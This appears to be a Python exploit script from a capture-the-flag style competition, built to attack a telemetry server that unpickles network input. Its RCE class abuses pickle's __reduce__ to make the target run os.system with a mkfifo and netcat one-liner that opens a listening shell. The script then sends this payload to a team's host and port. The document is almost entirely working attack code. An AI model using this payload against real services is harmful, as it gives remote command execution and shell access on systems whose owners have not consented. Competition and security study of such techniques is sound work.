#!/usr/bin/python3

import pickle, socket, os
#from digest import Digest

HOST = '10.0.11.100' # Change to throw against a remote server instead
TEAM = 6
PORT = 1340 + TEAM

REVSHELLPORT = 1360 + TEAM

#import ballcosmos

# Define a digest object for collection of telemetry data

class Digest:
    tlmentries = []
    def run(self):
        print("running object")

class RCE(Digest):
    # This object will gain code execution on the unpickling server
    def __reduce__(self):
        # Spawn a reverse shell process, canot kill python for some reason
        cmd = ('rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 '+str(REVSHELLPORT)+' > /tmp/f')
        return os.system, (cmd,)

def send_fax(obj):
    #print(f"sndr: Connecting to HOST:{HOST} PORT:{PORT}")
    s = socket.create_connection((HOST, PORT))
    data = pickle.dumps(obj)
    s.send(data)
    #print(f"sndr: Sent data of size {len(data)}")
    print(s.recv(1024))
    s.close()

def init():
    digest = Digest()
    digest.tlmentries = ["COMM HK_TLM_PKT COMM_STATUS_STRING"]
    send_fax(digest)
    print("-----")
    digest = RCE()
    digest.tlmentries = ["COMM HK_TLM_PKT COMM_STATUS_STRING"]
    send_fax(digest)
    
    

init()
